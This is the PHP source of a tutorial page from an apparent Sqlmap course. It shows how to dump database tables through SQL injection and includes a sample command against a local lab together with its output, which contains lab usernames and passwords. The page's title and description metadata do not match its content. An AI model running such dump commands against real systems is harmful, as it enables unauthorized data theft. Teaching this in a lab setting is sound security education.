<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';

     // Title and description are set in page_header.php
    $title = "Get Database Structure Information";
    $description = "Learn how to bypass web application firewalls with Sqlmap.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'get-database-structure-information.php';
    $home = 'sqlmap-course-home.php#tutorials';
    $next = 'steal-database-table-data.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Steal database information</h1>
      <p>
        Stealing information from databases is the main reason that people try
        to exploit them with tools like Sqlmap. In this tutorial we will look at
        how to steal information from tables in relational databases. The following
        Sqlmap arguments will be covered.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate</pre>

      <h1 class="title toc">Dumping the table entries of the current database</h1>
      <p>
        The first argument in the list will dump all table entries of the database
        that is being used by the vulnerable application. If you want all data from
        all databases on the userver, use <span class="inline-code">
        &ndash;&ndash;dump&ndash;all</span>.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>--dump</mark> --random-agent --forms --batch

Database: sql_injection_labs
<mark>Table: product</mark>
[13 entries]
+---------+--------+
| name    | price  |
+---------+--------+
| Cup     | 1.50   |
| Plate   | 1.50   |
| Fork    | 1.50   |
| Knife   | 1.50   |
| Spoon   | 1.50   |
| Bowl    | 1.50   |
| Hat     | 3.00   |
| Desk    | 150.00 |
| Paper   | 15.00  |
| Chair   | 125.00 |
| Lamp    | 20.00  |
| Book    | 8.00   |
| Sticker | 0.50   |
+---------+--------+

[19:39:19] [INFO] table 'sql_injection_labs.product' dumped to CSV file 'C:\Users\Owner\AppData\Local\sqlmap\output\192.168.1.75\dump\sql_injection_labs\product.csv'
[19:39:19] [INFO] fetching columns for table 'user' in database 'sql_injection_labs'
[19:39:19] [INFO] fetching entries for table 'user' in database 'sql_injection_labs'
Database: sql_injection_labs
<mark>Table: user</mark>
[3 entries]
+------------------+---------------+
| password         | username      |
+------------------+---------------+
| P@$$w0rd         | david         |
| hackMe!          | lindsey       |
| SecurePassword:) | administrator |
+------------------+---------------+</pre>

      <p>
        Two tables exist in the databases <span class="inline-code">sql_injection_labs
        </span> which is the database that is being used by the vulnerable application.
        The command dumped all of the table data of the <span class="inline-code">product</span>
        and <span class="inline-code">user</span> tables.
      </p>

    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>